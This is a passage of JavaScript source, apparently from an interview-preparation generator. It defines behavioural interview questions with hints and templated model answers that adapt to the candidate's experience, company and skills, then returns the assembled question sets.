    { q:`Tell me about a time you were overwhelmed by the scope of a task or project. How did you recover?`, hint:'Break down the overwhelming thing into concrete next steps, communicate early, ask for help when needed - not as a last resort.', answer:`${hasExp ? `I went through this during a complex project at ${company0}` : 'I experienced this on a particularly complex academic project'} where the requirements expanded significantly after I had already started. The scope felt genuinely unmanageable. My first step was to stop trying to hold everything in my head and just write down every known task, no matter how small. That act alone reduced the feeling of overwhelm - the list was long but finite. I then sorted by dependency and impact, identified what absolutely had to be done first, and blocked out my schedule in half-day focused work segments. I also communicated proactively - I told my manager what I was holding and asked whether any part of the work could be shared or descoped. Some could. The project was delivered late by a few days, but in a managed and communicated way rather than a chaotic one. I learned that overwhelm is usually a signal to stop and organise, not to work harder at a pace that produces errors.` },
    { q:`Give an example of a time you had to make a decision with limited information and high stakes.`, hint:'Shows judgement under uncertainty. Describe the framework you used to decide, what you risked, and how it turned out.', answer:`${hasExp ? `There was an incident at ${company0} where` : 'There was a situation where'} a production issue was causing silent data inconsistencies, and we had about 30 minutes before it would affect a significant number of users. The root cause was not yet identified. I had to decide between rolling back the last deploy - which might not fix the actual issue and would roll back legitimate work - or pushing a targeted fix based on an educated guess about the cause. I made my decision using a principle I apply under uncertainty: what is the cost of being wrong in each direction? A rollback was reversible in under five minutes. The targeted fix, if wrong, could make things worse. I called the rollback, communicated the reason clearly to the team, and we used the breathing room to diagnose properly. The rollback fixed it. The key lesson: when one option is reversible and the other is not, prefer the reversible one even if you think the other is more likely to be right.` },
    { q:`Describe a time you had to influence a decision or outcome without having direct authority over the people involved.`, hint:'Persuasion, coalition building, using data, finding shared goals. The ability to lead without authority is highly valued at all levels.', answer:`${hasExp ? `At ${company0},` : 'On a cross-team project,'} I identified that two teams were building overlapping infrastructure independently - each solving the same problem in slightly different ways. I was not a manager or tech lead at the time, but the duplication seemed genuinely costly. I could not mandate a change. Instead, I booked a meeting with both teams to present a side-by-side comparison I had put together: development cost, maintenance burden, inconsistency risks. I came with a specific proposal for a shared approach rather than just pointing out the problem. I also made sure to align with one senior engineer on each team beforehand so they were not hearing it cold in the meeting. The conversation was productive because I had done the homework, respected both teams' work, and focused on shared goals rather than assigning blame. We agreed on a shared approach. The lesson I took is that influence without authority works when you combine data, respect, and a clear ask - not just advocacy.` },
    { q:`Tell me about a time you received critical feedback that was difficult to hear. How did you process it and what changed?`, hint:'Shows emotional maturity. Separate the feedback from the delivery. Show you implemented the change and followed up on it.', answer:`${hasExp ? `During a performance review at ${company0},` : 'After a significant peer review session,'} I received feedback that I was sometimes dismissive of ideas in meetings - that I would acknowledge something quickly and move on in a way that felt like I had not really considered it. My initial reaction was defensive. I did not think of myself that way and felt the assessment was unfair. But I have learned to give feedback time before reacting to it. I sat with it for a day and started mentally reviewing specific meetings from the prior weeks. I started to see what they were describing: when I had already formed an opinion, I was moving fast to close the conversation, and it was reading as dismissiveness. I started consciously pausing before responding in meetings, often restating the other person's point before offering my view. Several weeks later, I asked for specific feedback on whether the change was noticeable, and the response was positive. It was uncomfortable feedback, but it genuinely improved how I collaborate.` },
    { q:`Describe a time you had to learn a new skill or domain under significant time pressure. What was your approach?`, hint:'Focused learning (not breadth), asking experts directly, applying it immediately, iterating fast. Show you can learn on the job.', answer:`${hasExp ? `I was assigned to a project at ${company0} that required deep knowledge of` : 'A project I joined suddenly required expertise in'} ${skills[0] || 'a technology'} that I had limited prior experience with. The timeline was two weeks to produce working, production-quality output. My approach to compressed learning is the same every time: I do not try to learn everything - I identify the specific subset I need for the immediate task and go deep on that. I found the most authoritative documentation and one high-quality reference project, built a minimal working version of the exact thing I needed to produce, and identified two people who knew the domain well for targeted questions when I hit genuine blockers. I do not ask broad questions when I am learning under pressure - I ask specific, precise questions that I cannot answer by reading for five more minutes. I delivered on time. The pattern I have internalised is that compressed learning is about ruthless prioritisation of what is actually needed, not about covering all the ground.` },
    { q:`Tell me about the most stressful work situation you have been in. How did you manage yourself and the people around you?`, hint:'Stress management, communication, protecting your team, escalating vs. absorbing - there is no perfect answer, but show self-awareness.', answer:`${hasExp ? `The most stressful period I experienced was at ${company0} during` : 'The most stressful professional experience I have had was during'} a time when a critical deadline was at risk simultaneously with a team member being unavailable and a key system behaving unexpectedly in staging. Everything happened at once. I noticed my first instinct was to absorb all the stress and work around the clock - which I know from experience does not end well. Instead, I stopped, took 20 minutes to write down every open item and its current status, and communicated transparently with my manager about the full picture rather than trying to protect everyone from the reality. I then deliberately focused the team's energy: one person on the production risk, one on the delivery timeline, and I coordinated both. I also set a hard end time each day so we stayed sharp. The situation resolved, not without some difficulty, but with everyone's trust intact. I learned that stress is contagious and so is calm - and that transparency, even when it feels exposing, consistently leads to better outcomes than absorbing everything silently.` },
    { q:hasExp ? `Describe a time when a project or initiative you led did not achieve its intended goal. How did you handle the post-mortem?` : `Tell me about a challenging group project or academic assignment and how you navigated the difficulties within the team.`, hint:'Blameless root cause analysis, clear learnings documented, changed the process - not just the people. Maturity of response matters most.', answer:hasExp ? `${hasExp ? `At ${company0}, I led` : 'I led'} an initiative to improve the reliability of a core system that had been causing recurring incidents. We invested several weeks in the work, ran it through staging, and deployed it with confidence. The incidents did not improve as expected - the root cause turned out to be elsewhere in the system, something our investigation had not surfaced. I felt the weight of having led the team toward the wrong solution. For the post-mortem, I explicitly framed it as blameless: the goal was to understand what led to the incorrect diagnosis, not to assign fault. We identified three process gaps - insufficient monitoring coverage, assumptions that went unchallenged in the design review, and incomplete integration testing. I documented these with specific action items, not generic notes. Two of the three changes were implemented within a month. The initiative did not hit its goal, but the process improvement that came from the failure has prevented more issues than the original effort would have fixed. That outcome made the failure worthwhile.` : `During a group project${school ? ` at ${school}` : ''}, our team of four struggled with unclear ownership and different levels of commitment. Some members were disengaged and progress was stalling. I was not the assigned lead, but I called a short alignment meeting and proposed we explicitly divide the work into named owners with weekly check-ins. I also offered to take the most uncertain, technically risky part myself, which seemed to shift the energy - people engaged more when ownership was clear and someone had stepped into the ambiguity. We delivered on time. What I learned is that unclear ownership is often the root cause of disengaged teams, and that someone stepping up to define it - without being dramatic about it - often unlocks the group.` },
  ];

  return {
    hr,
    technical: tech.slice(0, 22),
    roleSpecific: roleSpecific.slice(0, 12),
    projects: projectQs.slice(0, 10),
    situational,
    isFresher,
    role,
  };
}
